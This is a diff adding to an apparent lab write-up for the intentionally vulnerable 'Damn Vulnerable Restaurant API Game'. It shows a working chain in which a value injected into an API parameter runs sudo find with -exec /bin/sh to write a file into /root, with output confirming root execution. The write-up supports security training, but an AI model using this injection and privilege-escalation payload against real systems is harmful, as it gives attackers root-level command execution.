@@ -153,3 +153,21 @@ curl -k -H "Authorization: Bearer ${CHEF_TOKEN}" \
 {"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm\nMatching Defaults entries for app on 1847d1ddb7e1:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser app may run the following commands on 1847d1ddb7e1:\n    (ALL) NOPASSWD: /usr/bin/find"}
 ```
 :boom: "app" user has permission to run the /usr/bin/find command as root without a password (NOPASSWD). This is a banger of finding because the find command can be exploited to execute arbitrary commands with elevated privileges.
+
+# create a garbage file under /root
+```bash
+curl -k -H "Authorization: Bearer ${CHEF_TOKEN}" \
+"http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20/usr/bin/find%20/tmp%20-type%20f%20-exec%20/bin/sh%20-c%20'echo%20RCE%20test%20%3E%20/root/garbage.w00t'%20\\;"
+{"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm"}
+```
+```bash
+podman exec --user=root  damn-vulnerable-restaurant-api-game-web-1 ls /root/
+total 24
+drwx------.  2 root root  67 Apr 19 17:01 .
+dr-xr-xr-x. 22 root root  63 Apr 19 16:42 ..
+-rw-------.  1 root root  62 Apr 19 17:00 .bash_history
+-rw-r--r--.  1 root root 570 Jan 31  2010 .bashrc
+-rw-r--r--.  1 root root 148 Aug 17  2015 .profile
+-rw-r--r--.  1 root root 254 Jun 13  2023 .wget-hsts
+-rw-r--r--.  1 root root   9 Apr 19 17:01 garbage.w00t
+```
